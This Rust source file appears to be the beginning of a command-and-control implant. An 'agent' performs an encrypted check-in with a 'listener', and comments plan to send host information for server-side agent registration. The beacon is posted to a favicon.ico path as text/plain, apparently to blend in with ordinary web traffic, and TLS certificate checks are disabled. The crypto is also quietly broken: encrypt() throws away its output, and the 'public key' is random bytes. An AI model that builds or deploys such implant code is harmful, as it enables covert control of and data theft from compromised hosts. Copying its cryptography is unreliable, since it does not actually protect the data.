use crypto::aead::{AeadDecryptor, AeadEncryptor};
use rand::{Rng, rand_core::UnwrapErr};
use reqwest::{Client, Proxy};
use serde::{Deserialize, Serialize};
use anyhow::anyhow;

const MAGIC_NUMBER: u16 = 0xf3f3;
const NONCE_LEN: usize = 12;
const LENGTH_LEN: usize = 8;
const AAD_LEN: usize = NONCE_LEN + LENGTH_LEN;
const TAG_LEN: usize = 16;

#[derive(Serialize, Deserialize, Debug)]
pub struct Packet {
    pub magic: u16,
    pub length: u64,
    pub body: Body,
}

impl Packet {
    pub fn new(inner_packet: Vec<Tlv>) -> Self {
        Self { 
            magic: MAGIC_NUMBER,
            length: serde_cbor::to_vec(&inner_packet).unwrap().len() as u64, // TODO
            body: Body::Plain(inner_packet),
        }
    }


    pub fn encrypt(&mut self, key: [u8; 32]) -> Result<(), anyhow::Error>{
        match &self.body {
            Body::Encrypted {nonce: _, cipher_text: _, tag: _} => return Err(anyhow!("Packet already encrypted")),
            Body::Plain(plain_tlv) => {
                let mut nonce = [0_u8; NONCE_LEN];
                rand::rng().fill_bytes(&mut nonce);
                let plain = serde_cbor::to_vec(&plain_tlv)
                    .map_err(|e| anyhow!("{e}"))?;

                let mut chacha20 = crypto::chacha20poly1305::ChaCha20Poly1305::new(
                    &key,
                    &nonce,
                    &vec![],
                );

                let mut encrypted = vec![];
                let mut tag = vec![];
                chacha20.encrypt(&plain, &mut encrypted, &mut tag);
            },
        };

        Ok(())
    }
    
    pub fn decrypt(&mut self, key: [u8; 32]) -> Result<Vec<Tlv>, anyhow::Error> {
        match &self.body {
            Body::Plain(_) => return Err(anyhow!("Packet already decrypted")),
            Body::Encrypted {nonce, cipher_text, tag} => {
                let mut chacha20 = crypto::chacha20poly1305::ChaCha20Poly1305::new(
                    &key,
                    nonce,
                    &vec![],
                );
                let mut buf = vec![];
                chacha20.decrypt(cipher_text, &mut buf, tag);
                let tlv = serde_cbor::from_slice(&buf)
                    .map_err(|e| anyhow!("{e}"))?;
                Ok(tlv)
            }
        }
    }
}

#[derive(Serialize, Deserialize, Debug)]
pub enum Body {
    Plain(Vec<Tlv>),
    Encrypted {
        nonce: [u8; NONCE_LEN],
        cipher_text: Vec<u8>,
        tag: [u8; TAG_LEN],
    },
}

impl Body {
    pub fn associated_data(&self) -> Vec<u8> {
        match self {
            Body::Plain(_) => vec![],
            Body::Encrypted { nonce, cipher_text: _, tag: _ } => {
                let mut out = [0u8; NONCE_LEN];
                out[..NONCE_LEN].copy_from_slice(nonce);
                out.to_vec()
            },
        }
    }
}

#[derive(Serialize, Deserialize, Debug)]
pub enum Tlv {
    CheckinReq(CheckinRequest),
    CheckinRes(CheckinResponse),
    CheckinCompleteReq(CheckinCompleteRequest),
    CheckinCompleteRes(CheckinCompleteResponse),
}

#[derive(Serialize, Deserialize, Debug)]
pub struct CheckinRequest { // ここのみ平文
    pub agent_pubkey: [u8; 32],
}

#[derive(Serialize, Deserialize, Debug)]
pub struct CheckinResponse { // ここのみ平文
    pub listner_pubkey: [u8; 32],
}

#[derive(Serialize, Deserialize, Debug)]
pub struct CheckinCompleteRequest { 
    pub agent_info: String, // 共通鍵で暗号化したホストの情報などを送る // TODO
}

#[derive(Serialize, Deserialize, Debug)]
pub struct CheckinCompleteResponse { // ↑が復号できればCheckin完了、サーバ側でAgent登録
    pub listener_id: String,
    pub agent_id: String,
}

#[tokio::main]
async fn main() -> Result<(), reqwest::Error> {
    let mut tlvs = vec![];
    let mut pubkey = [0_u8; 32];
    rand::rng().fill_bytes(&mut pubkey);
    tlvs.push(Tlv::CheckinReq(CheckinRequest { agent_pubkey: pubkey}));
    let checkin_packet = Packet::new(tlvs); 

    let bytes = serde_cbor::to_vec(&checkin_packet).unwrap();
    let client = reqwest::Client::builder()
        .proxy(Proxy::all("http://localhost:8080").unwrap())
        .danger_accept_invalid_certs(true)
        .build()?;
    let res = client.post("http://localhost:9999/favicon.ico")
        .body(bytes)
        .header("Content-Type", "text/plain")
        .send()
        .await?;
    let bytes = res.bytes().await?.to_vec();
    
    let checkin_res: Packet = serde_cbor::from_slice(&bytes).unwrap();
    println!("{checkin_res:?}");
    Ok(())
}
